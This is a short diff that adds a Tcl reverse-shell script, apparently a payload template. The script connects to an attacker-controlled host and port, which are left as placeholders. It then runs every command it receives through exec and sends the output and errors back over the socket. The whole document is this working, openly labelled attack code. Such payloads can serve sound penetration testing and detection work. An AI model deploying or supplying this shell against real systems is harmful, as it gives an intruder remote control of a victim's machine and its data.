@@ -1,0 +1,19 @@
+# Open a new TCP socket and connect to the attacker
+set sock [socket *\host* *\port*]
+
+# Read commands from socket until connection is closed
+while {[gets $sock cmd] >= 0} {
+    # Prepare exec command with stderr redirected to stdout
+    set e "exec $cmd 2>@1"
+
+    # Try executing the command
+    if {![catch {set res [eval $e]} err]} {
+        puts $sock $res
+    } else {
+        puts $sock $err
+    }
+
+    flush $sock
+}
+
+close $sock
